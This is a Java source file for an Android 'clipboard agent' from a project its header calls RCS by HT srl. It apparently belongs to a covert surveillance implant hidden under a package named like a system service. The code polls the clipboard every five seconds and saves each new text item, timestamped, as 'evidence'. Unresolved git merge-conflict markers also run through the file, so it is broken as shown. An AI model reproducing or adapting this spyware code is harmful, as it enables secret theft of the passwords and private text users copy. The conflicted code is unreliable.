/* *******************************************
 * Copyright (c) 2011
 * HT srl,   All rights reserved.
 * Project      : RCS, AndroidService
 * File         : AgentClipboard.java
 * Created      : 6-mag-2011
 * Author		: zeno
 * *******************************************/

package com.android.service.agent;

import java.util.ArrayList;

import android.content.Context;
import android.text.ClipboardManager;

import com.android.service.LogR;
import com.android.service.Status;
import com.android.service.auto.Cfg;
import com.android.service.evidence.Evidence;
import com.android.service.evidence.EvidenceType;
import com.android.service.interfaces.IncrementalLog;
import com.android.service.util.Check;
import com.android.service.util.DateTime;
import com.android.service.util.Utils;
import com.android.service.util.WChar;

public class AgentClipboard extends AgentBase implements IncrementalLog {
<<<<<<< HEAD
	private static final String TAG = "AgentClipboard"; //$NON-NLS-1$

	ClipboardManager clipboardManager;
	static String lastClip = ""; //$NON-NLS-1$
=======
	private static final String TAG = "AgentClipboard";

	ClipboardManager clipboardManager;
	static String lastClip = "";
>>>>>>> devel
	
	LogR logIncremental;

	@Override
	public void begin() {
		logIncremental = new LogR(EvidenceType.CLIPBOARD);
		clipboardManager = (ClipboardManager) Status.getAppContext().getSystemService(Context.CLIPBOARD_SERVICE);
		if (Cfg.DEBUG) {
<<<<<<< HEAD
			Check.ensures(clipboardManager != null, "Null clipboard manager"); //$NON-NLS-1$
=======
			Check.ensures(clipboardManager != null, "Null clipboard manager");
>>>>>>> devel
		}
	}

	@Override
	public void end() {
		clipboardManager = null;
		logIncremental.close();
	}

	@Override
	public boolean parse(AgentConf conf) {
		setPeriod(5000);
		return true;
	}

	@Override
	public void go() {

		final String ret = clipboardManager.getText().toString();
		if (ret != null && !ret.equals(lastClip)) {
			if (Cfg.DEBUG) {
				Check.log(TAG + " (go): captured " + ret) ;//$NON-NLS-1$
			}
			saveEvidence(ret);
			lastClip = ret;
		}
	}

	private void saveEvidence(String ret) {

		final byte[] tm = (new DateTime()).getStructTm();
		final byte[] payload = WChar.getBytes(ret.toString(), true);
		final byte[] process = WChar.getBytes("", true); //$NON-NLS-1$
		final byte[] window = WChar.getBytes("", true); //$NON-NLS-1$

		final ArrayList<byte[]> items = new ArrayList<byte[]>();
		items.add(tm);
		items.add(process);
		items.add(window);
		items.add(payload);
		items.add(Utils.intToByteArray(Evidence.EVIDENCE_DELIMITER));

		if (Cfg.DEBUG) {
<<<<<<< HEAD
			Check.asserts(logIncremental != null, "null log"); //$NON-NLS-1$
=======
			Check.asserts(logIncremental != null, "null log");
>>>>>>> devel
		}
		logIncremental.write(items);

	}

	public void resetLog() {
		if(logIncremental.hasData()){
			logIncremental.close();
			logIncremental = new LogR(EvidenceType.CLIPBOARD);
		}
	}

}
